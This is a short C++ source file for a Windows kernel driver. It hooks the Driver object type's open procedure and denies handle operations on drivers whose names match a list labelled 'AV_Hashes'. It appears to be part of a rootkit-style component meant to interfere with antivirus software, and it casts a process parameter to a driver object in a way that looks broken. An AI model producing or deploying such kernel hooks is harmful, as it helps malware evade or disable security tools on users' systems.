#include "object_init_table.h"
#include "modules.h"
#include "includes.h"
#include "nt_structs.h"

ob_type_hook_pair driver;

NTSTATUS __fastcall object_type_init_hooks::hk_driver_open_procedure( e_ob_open_reason open_reason, uint8_t access_mode, PEPROCESS parent_process, PEPROCESS target_process, unsigned int* granted_access, unsigned long handle_count ) {

    if ( !parent_process || !target_process || !granted_access )
        return STATUS_INVALID_PARAMETER;

    auto* driver_object_parent = reinterpret_cast< DRIVER_OBJECT* >( target_process ); 

    if ( open_reason == e_ob_open_reason::ob_create_handle || open_reason == e_ob_open_reason::ob_duplicate_handle || open_reason == e_ob_open_reason::ob_open_handle ) {

        for ( auto hash : globals::AV_Hashes ) {
            if ( AV::driver_name_extraction( driver_object_parent, hash ) ) {
                return STATUS_ACCESS_DISABLED_BY_POLICY_DEFAULT;
            }
        }
    }
    
    return hook_metadata.driver.o_open_procedure( open_reason, access_mode, parent_process, target_process, granted_access, handle_count );

}

